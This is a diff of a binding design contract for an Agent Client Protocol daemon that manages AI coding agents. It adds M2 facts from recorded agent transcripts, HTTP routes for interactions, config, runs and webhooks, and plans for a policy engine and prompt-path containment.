@@ -1,20 +1,32 @@
-# omni-acp — M1 Code-Level Contract
+# omni-acp — M2 Code-Level Contract
 
-> Status: **binding** · 2026-09-04 · derived from `docs/DESIGN.md` v0.8 (D1–D15 settled),
-> `docs/research/transcripts/claude-acp-0.73.0/` (11 processes, 407 lines, the M1 ground truth) and
-> the shipped M0 code on `main` (978 tests green).
+> Status: **binding** · 2026-09-09 · derived from `docs/DESIGN.md` v0.8 (D1–D15 settled),
+> `docs/research/transcripts/claude-acp-0.73.0/` (18 processes: 11 M1 + 7 M2) and
+> `docs/research/transcripts/codex-acp-1.8.0/` (8 processes: 5 M0/M1 + 3 M2), and the shipped M0+M1 code
+> on `main` (2166 tests green).
 >
-> This document is the single source of truth for **M0 and M1 shapes**. Every signature in §5 becomes a
-> scaffold stub verbatim. Work packages (see `docs/M1-PLAN.md`) fill bodies in; they do not change
+> This document is the single source of truth for **M0, M1 and M2 shapes**. Every signature in §5 becomes a
+> scaffold stub verbatim. Work packages (see `docs/M2-PLAN.md`) fill bodies in; they do not change
 > signatures. A signature change is a renegotiation of this document, not a commit.
 >
-> **Reading M0 vs M1.** M0's text is kept in place, because M0 shipped and its reasoning is still the
-> reason the code looks the way it does. Wherever M1 changes an M0 statement, the M0 sentence carries a
-> `~~strikethrough~~` or a **SUPERSEDED BY §n** banner and the new rule is stated next to it — never by
-> silently rewriting history. §12–§18 are new and are M1-only. §11.4–§11.6 record the M1 rulings.
+> **Reading M0 vs M1 vs M2.** Shipped text is kept in place, because it shipped and its reasoning is still
+> the reason the code looks the way it does. Wherever a later milestone changes an earlier statement, the
+> earlier sentence carries a `~~strikethrough~~` or a **SUPERSEDED BY §n** banner and the new rule is
+> stated next to it — never by silently rewriting history. §12–§18 are M1-only. §19–§27 are new and are
+> M2-only. §11.4–§11.6 record the M1 rulings; §11.7–§11.9 record the M2 rulings.
+>
+> **M2 is two slices.** **M2-A** is the interaction lifecycle, the idle watchdog and the config route —
+> §19, §21, §22. **M2-B** is the policy engine, MCP presets and env, the Run API and webhooks, the diff
+> provider and prompt-content containment — §20, §23, §24, §25, §26. M2-A ships first and is independent
+> of M2-B: with no policy engine injected, `onUnresolved` is a *constant* policy and the daemon is M1 plus
+> a park.
 >
 > Where D1–D15 already decided something, this document only makes it typed. Where the three
-> M1 proposals disagreed, §11.5 records the decision and the one-line reason.
+> M2 proposals disagreed, §11.8 records the decision and the one-line reason.
+>
+> **Every shape below that the corpus can ground cites the transcript file it came from.** A shape with no
+> citation is either ours (an `omni.*` payload, an HTTP body) or is explicitly marked `unverified`, and the
+> compat suite refuses to assert an `unverified` row (§18.3).
 ---
 
 ## 0. Facts verified against the artefacts (not recalled)
@@ -58,6 +70,35 @@ Every row was executed or measured while writing this document. Each one changes
 | F22 | `Worker.prompt()` and `Worker.cancel()` already call `this.#deps.lease.assertHolder(who)` as their first statement. | `packages/core/src/worker/worker.ts:274, :369` | D5 enforcement lands with **zero edits to `worker.ts`** — WP‑D swaps the `Lease` factory the registry passes in. This is the payoff of M0's DI and it is what keeps the lease work package file-disjoint (§16.1). |
 | F23 | `reduceTurn`'s `upsertToolCall` already folds **both** `tool_call` and `tool_call_update`, already implements "an absent field means unchanged", and already replaces `content` wholesale. | `packages/protocol/src/turn.ts:135-208` | Corpus finding 3 ("merge, never replace") is already satisfied in the projection. The Normalizer's `tool_call → tool_call_update` row is therefore a **rename of the discriminant and nothing else**; merging in the mapper would make the stream a materialized view and break `?since=` (§12.1, ruling M1-R13). |
 | F24 | claude-acp answers `initialize` with `protocolVersion: 1` and hangs `session/prompt` (v1), while already emitting `usage_update` and `config_option_update`, already returning `configOptions` from `session/new`, and already implementing `session/set_config_option` / `session/list` / `session/resume` (v2). | corpus, all 11 | The v1→v2 map is **per-field and per-method, descriptor-driven, and idempotent on already-v2 fields**. No mapping rule may read a version number. `Normalizer.sourceProtocolVersion` is for reporting only (§12.2). |
+### 0.2 M2 facts — verified against the 2026-09-09 corpora and the shipped code, not recalled
+
+Every row was read out of a transcript or executed against `main` while writing this document. "claude `NN`"
+means `docs/research/transcripts/claude-acp-0.73.0/NN-*.jsonl`; "codex `NN`" means
+`docs/research/transcripts/codex-acp-1.8.0/NN-*.log`.
+
+| #   | Fact | Evidence | Consequence |
+| --- | ---- | -------- | ----------- |
+| F25 | `session_info_update` lands **5–22 ms AFTER `session/prompt` resolves**, in **7 of 7** M2 runs and **0 of 11** M1 runs — against the same pinned adapter version. | claude `11`–`17`; README finding 16 | The idle watchdog's quiet window is anchored on the **last update appended**, never on the prompt response, or it races a post-response update on literally every turn (§21.2). It is also the strongest form of M1's finding 14. |
+| F26 | `allow-with-updates` (`kind: allow_always`) is a **real session-wide grant and nothing on the wire announces it**: one `session/request_permission`, two files written, `end_turn`, no `config_option_update`, no `current_mode_update`. | claude `11` | D4 rule 3 stays absolute for the daemon; a **human** answer naming an `allow_always` optionId is `400` unless an operator opts in, and the opt-in sets sticky `WorkerSnapshot.policyBlinded` and warns on every subsequent turn (§19.7). |
+| F27 | The `allow_always` option's `name` is **contextual**; only `kind` and `optionId` are stable. One `{optionId:"allow-with-updates", kind:"allow_always"}` arrived under three different names, one of which **embeds a path**. | claude `11`, `16`, `17` | `PolicyMatch` has no `title` / `name` clause, and the `no-agent-prose` guard forbids adding one. Match on `kind`, fall back to `optionId` (§20.3). |
+| F28 | Elicitation is gated on the **client** capability and this adapter honours the gate: with `elicitation:{form:{},url:{}}` a real `elicitation/create` arrives; with `clientCapabilities:{}` and the byte-identical prompt there is **no request and no tool call at all** — the model asks in prose and ends the turn. `initialize`'s `agentCapabilities` never mentions elicitation either way. | claude `12`/`13` vs `14` | D10's gate is confirmed end to end. Declaring only under `onUnresolved:"park"` genuinely changes agent behaviour, and **not** declaring is safe — the agent degrades, it does not hang or error (§19.2). |
+| F29 | `elicitation/create` params are **flat**: `{mode:"form", sessionId, toolCallId, message, requestedSchema}`. The `ElicitationSessionScope` fields are **not** nested under a `scope` key. No `required` array, no schema-level `title`/`description`. Only `mode:"form"` was ever seen. | claude `12` params, read in full | `MappedElicitationRequest` reads flat fields. A type that models scope as a nested object parses **nothing** a real claude-acp sends (§19.3). |
+| F30 | ONE question becomes **two** schema properties: `question_0` (`type:"string"`, `title`, **`oneOf:[{const,title,description}]` — not `enum`**) and `question_0_custom` (`title:"Other"`, marked by `_meta._askUserQuestionCustomAnswer:{questionId:"question_0", isCustomAnswer:true}`). Our accept filled **both** and the agent used the **custom** one: it created `omni-choice.txt`, not the selected `notes.md`. | claude `12` | Answers are keyed by **questionId**, never by property name, and **exactly one property per question** reaches the wire. The `_meta` marker silently wins, so the inbound parse must stay `verbatim`: a `z.object` would strip the one field that decides the outcome (§19.4). |
+| F31 | Accept and decline are **indistinguishable in the agent's stream**: both end `end_turn`, and both leave the `AskUserQuestion` tool call `status:"completed"` — decline's `rawOutput` is `"The user did not answer the questions."` | claude `12`/`13` | The daemon records the interaction outcome itself; `deny` and `parkTimeoutAction` results cannot be recovered from the agent's stream at all. `deniedToolCalls` is therefore gated on `method === "session/request_permission"` (§19.9). |
+| F32 | An `elicitation/create` is **also mirrored in the stream** as a `tool_call` with `_meta.claudeCode.toolName:"AskUserQuestion"`, `kind:"other"`, `title:"Asking for your input"` — the same interaction appears twice. | claude `12` | `InteractionRecord.toolCallId` is the join. `TurnResult.interactions` and `TurnResult.toolCalls` are separate arrays and neither feeds the other, so the same interaction is never counted twice (§19.9). |
+| F33 | `elicitation/create` and `session/request_permission` **share one agent→client JSON-RPC id counter** (`12`: the elicitation is id 0, the later permission is id 1). | claude `12`; README method table | The transport id can never be the interaction identity. `InteractionId` is **daemon-minted** `x_<ULID>`, and the `interaction-id-is-daemon-minted` guard pins it (§19.1). |
+| F34 | `session/set_config_option{sessionId, configId:"model", value:"haiku"}` works, emits **no** `config_option_update`, and returns a **full replacement list whose membership shrank from four entries (`mode`,`model`,`effort`,`fast`) to two (`mode`,`model`)** because Haiku exposes no effort levels. The **request** parameter is `configId` (`optionId` is `-32602`); each returned **entry** is keyed `id`, with `currentValue`. | claude `15`, request and both result lists read in full | `WorkerSnapshot.configOptions` is refreshed from the **method's own result** and replaced **wholesale** — merging by id would leave a phantom `effort` forever. The request spelling and the entry spelling are different words and §22 names both. |
+| F35 | codex-acp's list does **not** shrink: all five entries survive every set. `fast-mode` is **new** in `session/new` since the 02–06 recordings, with the adapter version unchanged. | codex `07` | Membership churn is a **per-agent behaviour, not a protocol rule** — wholesale replacement is the only handling correct for both. And the pinned adapter does not pin the wire surface (§11.9). |
+| F36 | Cancelling a turn with a tool genuinely in flight **strands that call with no terminal `tool_call_update`, on both agents**: claude leaves its last observed `status:"pending"`, codex leaves `"in_progress"`. Neither ever sends `completed`, `failed` or `cancelled` for it. | claude `16`, codex `08` | `TurnResult.strandedToolCalls` reports them, the verdict is `partial`, and aggregation never blocks waiting for a terminal update. We do **not** synthesize a status (ruling M2-R8, §21.5). |
+| F37 | `resource_link` prompt content is accepted by **both** agents and contained by **neither**. claude expands each link into its own `Read`; the in-`cwd` read runs silently and the out-of-`cwd` read raises a permission whose only distinguishing marker is the vendor **string** `_meta.permission.description: "Reason: Path is outside allowed working directories"` with `kind` plain `read`. codex asks nothing, reads both in **one** call reported `kind:"read"`, and echoes `OUTSIDE-SECRET-BETA`. | claude `17`, codex `09` | Containment must run **before the prompt is sent** (§26). Downstream there is nothing to check: one agent's marker is English, the other's audit trail omits the path. Any preset that auto-allows `kind:read` exfiltrates every absolute path a client can name. |
+| F38 | codex **under-reports what a call touched**: for the two-file read, `title` and `locations[]` name only the inside file, and the call carries **no `rawInput` whatsoever**. | codex `09` | A `path` clause **narrows and never authorises**, and a `cmd` clause on a `tool_call` subject is rejected at compile — there is nothing for it to match on for a call this agent classifies as `read` (§20.3). |
+| F39 | codex-acp **creates `.git/`, `.codex/` and `.agents/` in its own `cwd` mid-session**; the recorder made none of them. | codex `08` `workspace_after` | "outside a repo ⇒ `patch: null`" is a **per-turn** question, not a per-worker one. The git provider probes at both ends of every turn and returns `null` rather than a garbage diff when the top level moved (§25.3). |
+| F40 | Some `execute` calls are auto-allowed and some are not, and the split is **invisible in the frame**: a read-only `ls -A <cwd>` ran to `completed` with no permission request, while `python3 -c …` in the same `cwd` raised one. | claude `13` vs `16` | Policy is evaluated on what actually **arrives**; "no permission request" must never be read as "no tool ran". Hence `PolicyPreset.alertOnUnpoliced` and `TurnWarning{code:"unpoliced_tool_call"}` (§20.6). |
+| F41 | A host banner arrives as a **`messageId`-less** `agent_message_chunk` on codex, with no `_meta`, unlike every real answer chunk. It appears in none of 02–06. | codex `07`–`09` | claude's finding 2 ("`messageId` is present — do not backfill it") does not hold for codex; grouping keyed on `messageId` must tolerate absence. The watchdog counts it as liveness, which is accepted and argued in §11.9. |
+| F42 | **`clientCapabilities: {}` is hard-coded in two separate files** — `packages/core/src/worker/handshake.ts:285` (create) and `packages/core/src/worker/session-open.ts:251` (**wake**). | read on `main`, 2026-09-09 | D10's per-worker gate must be threaded through `SessionOpenOptions` and used by BOTH, or a parked worker that hibernated wakes **silently unable to be asked anything**. This is the one migration hazard M2-A cannot skip (§19.2). |
+| F43 | `WORKER_STATES` already carries `requires_action`; `packages/daemon/src/registry.ts:130`'s `OCCUPIES_A_SLOT` **already lists it**; `packages/core/src/acp/link.ts` already parses every inbound agent→client request with `verbatim`. | read on `main`, 2026-09-09 | The sixth state costs `events.ts` and `registry.ts` zero edits, and F30's `_meta` marker survives the inbound parse by construction — provided `elicitation/create` is registered the same way (§19.3). |
+| F44 | A bad config value answers `-32603` with `data.details: "Invalid value for config option model: no-such-model-xyz"` — the same code+pointer shape F17 recorded. | claude `15`, README method table | §22's bad-value path classifies through the descriptor's `errorRules` on **code + a JSON pointer into `data`**, never on message text. |
+| F45 | `packages/core/src/worker/worker.ts` stamps `acp.interaction` with `payloadVersion: 1` and its own comment pre-announces the flip: *"when M2 normalizes `session/request_permission` to D4's `{title, subject, options}` shape, THAT is the moment this flips to 2."* | `worker.ts:1277-1286` | The flip is a promise M1 made, not a break M2 invents (ruling M2-R3). |
 ---
 
 ## 1. Conventions (settled; do not debate)
@@ -85,11 +126,11 @@ surface) and `@agentclientprotocol/sdk` at exactly `1.4.0`. M1 adds one runtime 
 
 ---
 
-## 2. M0 + M1 slice — what is IN
+## 2. M0 + M1 + M2 slice — what is IN
 
-> §2.1/§2.2 carry M0's rows unchanged (they shipped) plus the M1 rows. §2.3 is now **what is out of M1**;
-> every M0-deferred item that M1 lands has moved up into §2.1/§2.2 and is struck through in the M1
-> deferral table with the row that replaced it.
+> §2.1/§2.2 carry M0's and M1's rows unchanged (they shipped) plus the M2 rows — H22–H28 and L25–L34, each
+> marked **M2-A** or **M2-B**. §2.3 is now **what is out of M2**; every earlier deferral that M2 lands has
+> moved up into §2.1/§2.2 and is struck through in the deferral table with the section that replaced it.
 
 ### 2.1 HTTP surface (`/v1`)
 
@@ -119,6 +160,13 @@ for audit and — **from M1** — is the lease identity (D5); it is still **not*
 | **H19** | `POST /v1/workers/{wid}/wake`          | **M1.** `200 WorkerSnapshot{state:"ready"}`; the full outcome table is §15.5. Prompting auto-wakes, so this route exists for two reasons only: to let an operator pay the cold start deliberately, and to make a `422 not_resumable` observable **without burning a prompt**. Idempotent and single-flight: concurrent callers share one attempt. Lease-gated. |
 | **H20** | Lease gating, stated once              | **M1.** Gated: `prompt`, `cancel`, `hibernate`, `wake`, `DELETE` (or admin), and — when M2 lands them — `config` and `interactions`. **Ungated: every `GET`, and the SSE stream.** An optional `Omni-Lease-Epoch` header is a fencing check: present and stale ⇒ `423` even from the right client id (§16.1 rule L7). |
 | **H21** | `GET /v1/info` honesty                 | **M1.** `persistence.driver` says whether this daemon's logs survive a restart, `persistence.writeFailures` says whether they still do, and `orphansAtStart {found, reaped, skipped}` says what a previous boot left behind — including `skipped: n` on Windows, where nothing can be reaped (§15.7). An operator must be able to read these **before** anything goes wrong (§6.6's rule, extended). |
+| **H22** | `POST /v1/workers/{wid}/interactions/{reqId}` | **M2-A.** `200 InteractionAnswerResult`. **Lease-gated** (`423`, the epoch fence included) — H20 reserved it and §19.6 rules that admin has no bypass: `steal` first, so the takeover is audited. Unknown `reqId` on a visible worker → `404 interaction_not_found`; already settled → `409 interaction_settled` **carrying the settled snapshot**; `allow` on an `elicitation/create` (or `answer` on a permission) → `400`; an `optionId` the agent never offered → `400` (D4 rule 1, re-checked against the STORED request); an `allow_always` id → `400` unless `interaction.allowAlways:"human"`. Check order is fixed and tested: visibility → worker state → interaction existence → lease → body shape → semantics → deliver. §19.6. |
+| **H23** | `GET /v1/workers/{wid}/interactions`   | **M2-A.** `200 { interactions: InteractionSnapshot[] }` — the pending set, oldest first. **Ungated** (rule L2: every `GET`). An observer can see exactly what is being asked and cannot answer it, which is D5 applied to D10. |
+| **H24** | `POST /v1/workers/{wid}/config`        | **M2-A.** `200 SetConfigResponse`. Lease-gated. `409 worker_busy` while a turn is live (no agent was ever observed accepting a mid-turn set — F34/F35 both set between turns). `configOptions` is **replaced wholesale from the method's own result**, never from the event stream (F34, F35). A bad value is `502 agent_error` carrying the agent's `-32603 data.details` verbatim (F44). §22. |
+| **H25** | `POST /v1/runs` · `GET /v1/runs` · `GET /v1/runs/{rid}` · `GET /v1/runs/{rid}/events?since=` · `POST /v1/runs/{rid}/cancel` | **M2-B.** `202 RunSnapshot` on create. `…/events` **proxies the run's worker log**, so `?since=` semantics are M1's, byte for byte, and `sse.ts` stays frozen. An unknown run is `404 worker_not_found` — §11.8 ruling M2-R2 declines a `run_not_found` code. `idempotencyKey` returns the **original** run, across a restart. §24. |
+| **H26** | `GET /v1/webhooks/deliveries` · `POST /v1/webhooks/deliveries/{id}/redeliver` | **M2-B.** D9's dead-letter queue. `role:"admin"` or the owning token only; cursor-paginated; survives a restart. `redeliver` **keeps the same `deliveryId`** (that is what makes it a replay rather than a second event) and resets `attempt` to 0. §24.5. |
+| **H27** | `403 policy_exceeds_ceiling` becomes reachable | **M2-B.** Body carries `policy: {ceiling, offending}` — the third and last `OmniErrorBody` extra, under the same rule as `lease` and `resume`: present only when there is one, so two bodies for one failure stay deep-equal. §20.5. |
+| **H28** | Prompt content widens                  | **M2-B.** `PromptRequestBody`'s M0 text-only `.refine` is **deleted**, and the semantic gate moves into `WorkerRegistry.prompt()` → `assertPromptContent()`: `promptCapabilities` is per worker and containment is per token, and zod holds neither. An `assertPromptContent-is-called` guard covers the move, because a schema that silently stopped enforcing containment looks exactly like a schema that got more capable. §26. |
 
 ### 2.2 Library / core
 
@@ -140,31 +188,47 @@ M0 rows L1–L13 stand unchanged and are not restated except where M1 alters the
 | L22 | **`POST /v1/agents/{id}/probe`** + an on-disk probe cache, and `AgentCatalogEntry.probed` populated from it. §17.5.                                                                                                                                                                                                                   |
 | L23 | **Turn close-out: two ladders** — `settle` (per turn: quiet window, unchanged from M0) and `close_out` (teardown: quiet → `session/cancel` → close stdin → drain → terminate; the cancel precedes the stdin EOF because it travels on stdin, ruling M1-R4a). `closeStdin()` still never appears at turn end (§13, ruling M1-R4).                                                                                     |
 | L24 | **Config-driven compat suite** (`tests/compat/`) — the agent list is YAML, one real entry today (`claude-acp`), and adding an agent is a YAML edit with **zero code changes**, proven by a test. Skips are reported with a source and a reason; a skip with no source is a failure. §18.                                              |
+| L25 | **InteractionRequest, unified and answerable** — `session/request_permission` and `elicitation/create` converge on ONE lifecycle (D10): `onUnresolved: park \| deny \| fail`, the sixth worker state `requires_action`, `parkTimeoutMs` / `parkTimeoutAction`, and `elicitation.form` declared **only** under `park` — on create **and on wake** (F28, F42). §19. |
+| L26 | **`requires_action` becomes reachable.** `M2_WORKER_STATES` is the full six. `WORKER_STATES` and `registry.ts`'s `OCCUPIES_A_SLOT` already carried it, so the state costs those two files zero edits (F43). |
+| L27 | **Idle watchdog, dual budget** — a `silentMs` budget anchored on the **last update appended** (F25, never on the prompt response) and a larger `toolMs` budget while any tool call is open (F36: an open call can be a permanent condition). A parked interaction **disarms both**; the park timer owns that deadline. Firing sends `session/cancel` and escalates into M1's **existing** `cancel_timeout` close — no new close reason. §21. |
+| L28 | **`TurnResult.strandedToolCalls`** — tool calls whose last observed status is not terminal when the turn ended. Both real agents produce them on every cancel-with-a-tool-in-flight (F36). Reported, never synthesized; the verdict is `partial`. §21.5. |
+| L29 | **`POST /v1/workers/{wid}/config`** and a **live** `WorkerSnapshot.configOptions`, replaced wholesale from the method result (F34, F35). `AgentCapabilitiesSnapshot.configOptions` is frozen at handshake and becomes the historical record. §22. |
+| L30 | **Policy rule engine** (M2-B) — YAML rules on `kind` / `path` / `cmd`, named presets ⊕ inline rules, `policyCeiling` **enforced twice** (a decidable static check at create → `403`, plus a decision-time clamp that is never silent). D4's six hard rules stay in `permission-responder.ts`, **below** the engine, which never sees or produces an `optionId`. §20. |
+| L31 | **`mcpServers` named presets + `mcpCapabilities` filtering** and **per-worker `env`** — a client may name a preset and can never express a command (the type forbids it); a blacklisted env key is **rejected with a 400 naming it**, never silently dropped; env **values** never reach a snapshot, a log line or an HTTP body. §23. |
+| L32 | **Run API + webhook delivery** (D9) — thin payload, the 6-rung ladder with full jitter, `webhook_deliveries` + `redeliver`, HMAC `Omni-Signature`, `deliveryId` idempotency, an SSRF gate on the daemon's first outbound surface, and boot recovery for both runs and in-flight deliveries. `SCHEMA_VERSION` 1 → 2, CREATE-only. §24. |
+| L33 | **git diff provider for `TurnResult.patch`** (D8) — the temp-index `write-tree` technique, `null` outside a repo and **re-probed per turn** because codex creates `.git/` on its own (F39), `quality:"shared_worktree"` when another live worker shares the repo, and a named `TurnWarning` for every `null`. §25. |
+| L34 | **Prompt-content path containment** — `resource_link` and embedded `resource` URIs must be `file://`, absolute, and realpath into the token's `cwdRoots`, checked **before the prompt is sent** (F37, F38). §26. |
 
-### 2.3 What is OUT of M1 — deferred, one line each
+### 2.3 What is OUT of M2 — deferred, one line each
+
+> Every M1-deferred row that M2 lands is struck through below with the section that replaced it. The
+> unstruck rows are what is still out after M2.
 
 | Deferred                                                                                                                                                                                                                            | To                      |
 | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------- |
-| ~~Full v1→v2 map~~ · ~~`session/load`/`session/resume`, replay marking, resume four-state, `hibernated`, `422`~~ · ~~Event-log persistence, 7-day retention, restart-survivable `?since=`~~ · ~~Lease acquire/release/steal, `423`~~ · ~~Turn close-out beyond the quiet window~~ · ~~Vendor extension registry, Runtime descriptors, quirk table~~ · ~~`POST /v1/agents/{id}/probe`~~ | **LANDED in M1** — §12–§18 |
-| **v2→v1 reverse map.** D1 says the map's other half; M1 ships only v1→v2 because that is where the traffic is (DESIGN §1.1: 0 of 39 registry agents have v2 evidence).                                                              | M4 (D1)                 |
-| **Client Host `fs/*` / `terminal/*`.** D3 keeps `clientCapabilities: {}`; the corpus confirms across all 11 runs that the only agent→client methods are `session/update` and `session/request_permission`. §12.3's `terminal_update` / `terminal_output_chunk` rows are therefore **not implemented**. | M4 (D3)                 |
-| **`TurnResult.patch`** — stays `null`. The reconstructed vendor patch is `TurnResult.vendorPatch`, clearly labelled and descriptor-driven; D8's git provider remains the only source of truth for changes the agent did not self-report (ruling M1-R11). | M2 (D8)                 |
-| Policy rule engine, `onUnresolved: park\|fail`, `policyCeiling`, `POST …/interactions/{reqId}`, `requires_action` — M1's worker state set is `starting \| ready \| running \| hibernated \| closed`.                                | M2 (D4/D10)             |
-| `elicitation/create`                                                                                                                                                                                                                | M2 (D10)                |
-| `mcpServers` presets + `mcpCapabilities` filtering — M1 **still always sends `mcpServers: []`**. The MCP `type` injection rule (§12.3 row 22) is implemented and unit-tested but **unreachable from the wire**.                     | M2 (DESIGN §8)          |
-| Image / audio / `resource_link` / embedded-resource prompt content — still `type:"text"` only.                                                                                                                                       | M2 (DESIGN §5.1)        |
-| `authenticate` → `auth/login` — the map row and the descriptor spelling ship; there is **no real-agent exercise** (corpus gap), so the descriptor marks it `unverified` and the compat suite refuses to assert it.                   | M2                      |
-| Per-request `CreateWorkerRequest.env` + blacklist, credential store                                                                                                                                                                 | M2                      |
-| Webhooks, `POST /v1/runs`, Run API, idle watchdog dual budget                                                                                                                                                                       | M2 (D9)                 |
-| `POST /v1/workers/{wid}/config` — M1 **probes** the config methods and records their spellings; it does not expose them.                                                                                                             | M2                      |
-| **Lease persistence.** A restart leaves every worker unleased; the adoption pass emits `omni.lease{op:"expired", how:"daemon_restart"}` so the transfer is **audited rather than silent** (ruling M1-R8).                            | M2 (D5)                 |
-| `GET /v1/fs/*`, TLS/mTLS, token issue/revoke                                                                                                                                                                                        | M2–M4                   |
+| ~~Full v1→v2 map~~ · ~~`session/load`/`session/resume`, replay marking, resume four-state, `hibernated`, `422`~~ · ~~Event-log persistence, 7-day retention, restart-survivable `?since=`~~ · ~~Lease acquire/release/steal, `423`~~ · ~~Turn close-out beyond the quiet window~~ · ~~Vendor extensions and the probe~~ — all landed in M1. | done (M1)               |
+| ~~Policy rule engine, `onUnresolved: park\|fail`, `policyCeiling`, `POST …/interactions/{reqId}`, `requires_action`~~ | **done — §19 (M2-A), §20 (M2-B)** |
+| ~~`elicitation/create`~~                                                                                                                                                                                                            | **done — §19 (M2-A)**   |
+| ~~`POST /v1/workers/{wid}/config`~~                                                                                                                                                                                                 | **done — §22 (M2-A)**   |
+| ~~Webhooks, `POST /v1/runs`, Run API~~ · ~~idle watchdog dual budget~~                                                                                                                                                              | **done — §24 (M2-B), §21 (M2-A)** |
+| ~~**`TurnResult.patch`** — stays `null`~~ (ruling M1-R11's condition is met: the git provider is the only thing that may fill it, and it now exists) | **done — §25 (M2-B)**   |
+| ~~`mcpServers` presets + `mcpCapabilities` filtering~~ · ~~Per-request `CreateWorkerRequest.env` + blacklist~~       | **done — §23 (M2-B)**   |
+| ~~Image / audio / `resource_link` / embedded-resource prompt content~~                                               | **done — §26 (M2-B)**   |
+| **v2→v1 reverse map.** D1 says the map's other half; M2 still ships only v1→v2 because that is where the traffic is (DESIGN §1.1: 0 of 39 registry agents have v2 evidence). | M4 (D1)                 |
+| **Client Host `fs/*` / `terminal/*`.** D3 keeps the fs/terminal capabilities undeclared; across all **26** recorded processes the only agent→client methods are `session/update`, `session/request_permission` and `elicitation/create`. §12.3's `terminal_update` / `terminal_output_chunk` rows stay unimplemented — even though codex sends a `terminal` **content block** with no terminal capability declared (codex `08`), which is a payload, not a call. | M4 (D3)                 |
+| **`url`-mode elicitation and `elicitation/complete`.** Never observed on either agent; `elicitation.url` is therefore **not declared**, so the untested path is also unreachable. Declaring a mode we cannot service is how a turn hangs. | M4 (D10)                |
+| **Request-scoped elicitation and multi-question forms.** The schema supports both; no recording does. Fixture-covered and descriptor-`unverified`; the compat suite refuses to assert them. | M3/M4                   |
+| **`authenticate` → `auth/login`** — the map row and the descriptor spelling ship; still **no real-agent exercise** (both agents are logged in out of band), so the descriptor still marks it `unverified`. | M3+                     |
+| **Credential store beyond `agents[].env`.** Per-worker `env` lands (§23.3); a real secret store does not. `WorkerRow.env` is persisted in the `0600` database inside the `0700` `dataDir` and §11.9 names the exposure rather than hiding it. | M4                      |
+| **Lease persistence.** Still not persisted; adoption still emits `omni.lease{op:"expired", how:"daemon_restart"}` (ruling M1-R8). Interactions are likewise **not** persisted (ruling M2-R10). | M3/M4 (D5)              |
+| `GET /v1/fs/*`, TLS/mTLS, token issue/revoke                                                                                                                                                                                        | M3–M4                   |
 | `adopt: "prefer" \| "require"`, `daemon.json` discovery/reuse                                                                                                                                                                        | M3 (D14)                |
-| `Fleet`, `server.runs`, cross-daemon access to one `dataDir` (**one daemon per data dir, lock-enforced** — §14.10)                                                                                                                   | M3/M4 (D11)             |
+| `Fleet`, cross-daemon access to one `dataDir` (**one daemon per data dir, lock-enforced** — §14.10)                                                                                                                                 | M3/M4 (D11)             |
 | `/acp/{agentId}`, `AcpServer`, WebSocket, `@omni-acp/bridge`                                                                                                                                                                        | M4 (D12)                |
 | `agents: "auto"` discovery, registry install                                                                                                                                                                                        | M4 (DESIGN §7)          |
-| cgroup v2 / Job Object resource limits; a Windows Job Object that would also fix `treeGone` and orphan reaping                                                                                                                       | M2+                     |
+| cgroup v2 / Job Object resource limits; a Windows Job Object that would also fix `treeGone` and orphan reaping                                                                                                                       | M3+                     |
 | A second event-log backend (Postgres/S3) — the `EventStore` seam exists; only SQLite implements it.                                                                                                                                 | never scheduled         |
+| A separate audit log (DESIGN §8). The worker's own event log is still the audit trail (rule L9), now carrying `acp.interaction`, `omni.policy_decision` and `omni.run` as well.                                                     | M4                      |
 
 **Acceptance (DESIGN §11's M1 criterion, made mechanical).** The **config-driven compat suite** (§18) runs
 the identical SDK script against every configured agent — today `claude-acp` only, tomorrow a YAML edit —
@@ -179,6 +243,27 @@ returns `423` with the holder named, and its `steal` transfers the lease, bumps 
 first client's next call `423`. Agents not configured on this machine are **skipped with a printed
 reason**, never silently passed. Full script in `docs/M1-PLAN.md` §4.
 
+**Acceptance (DESIGN §11's M2 criterion, made mechanical).** The compat suite gains six cases (§27) and the
+end-to-end script in `docs/M2-PLAN.md` §4 must be green **twice in a row**, against the only two real agents
+on this machine — `claude-acp` and `codex-acp`, and no others:
+
+1. **park → answer → write.** A `claude-acp` worker created with `onUnresolved:"park"` and a write prompt
+   reaches `state:"requires_action"`; an observer's `GET …/interactions` shows the pending request while its
+   own `POST` is `423`; the lease holder's `worker.on("interaction", req => req.allow())` completes the turn
+   and **the file exists on disk**.
+2. **watchdog → `cancel_timeout`.** A fixture agent that opens a tool call and then goes silent trips the
+   `toolMs` budget, receives `session/cancel`, and escalates into a `cancel_timeout` close; the turn reports
+   `strandedToolCalls.length === 1` and `verdict:"partial"` without ever blocking.
+3. **config.** `codex-acp`'s `mode` switches `agent → read-only` through `POST …/config`, the returned list
+   **replaces** the snapshot's, and **zero** agent-emitted `config_option_update` envelopes appear on the
+   tail (F35).
+4. **webhook.** A `POST /v1/runs` with a webhook target is delivered exactly once to a local receiver, the
+   `Omni-Signature` verifies, and the `deliveryId` survives a daemon restart mid-flight.
+5. **patch.** A turn in a `git init`-ed `cwd` yields a non-null `TurnResult.patch` that `git apply --check`
+   accepts; the same turn in a non-repo `cwd` yields `null` plus a named warning.
+
+Agents not configured on this machine are **skipped with a printed source and reason**, never silently
+passed, and `OMNI_COMPAT_REQUIRE=1` still fails an empty selection. Full script in `docs/M2-PLAN.md` §4.
 ---
 
 ## 3. Package layout
@@ -2898,6 +2983,1368 @@ genuinely two controllers, §16.1 rule L4), sends `Omni-Lease-Epoch` when it kno
 **`@omni-acp/cli`**: `omni-acp probe <agent> [--deep] [--force]`, `omni-acp agents`,
 `omni-acp workers [--include-closed]`. `omni-acp start` writes `eventLog.driver: "sqlite"` into the config
 it builds (ruling M1-R17) unless the YAML says otherwise.
+### 5.8 M2 additions and diffs — these become the M2 scaffold stubs
+
+Every name below becomes a scaffold stub in the M2 Land step (`docs/M2-PLAN.md` §1) and is then owned by
+exactly one work package. Diffs are against `main` as of the M2 Land commit's parent.
+
+#### 5.8.1 `@omni-acp/protocol` — `src/ids.ts`
+
+```ts
+/** One InteractionRequest. DAEMON-MINTED: F33 — `elicitation/create` and `session/request_permission`
+ *  share ONE agent→client JSON-RPC id counter, so the transport id is not an identity a route may
+ *  address. The `interaction-id-is-daemon-minted` guard forbids reading a JSON-RPC id as one. */
+export type InteractionId = `x_${string}`;
+export type RunId = `r_${string}`;
+export type DeliveryId = `dl_${string}`;
+
+export const ID_PATTERN: { …; interaction: RegExp; run: RegExp; delivery: RegExp };
+export function assertInteractionId(s: string): InteractionId;
+export function assertRunId(s: string): RunId;
+
+export interface IdGen {
+  … // M0/M1's members unchanged
+  interaction(): InteractionId;
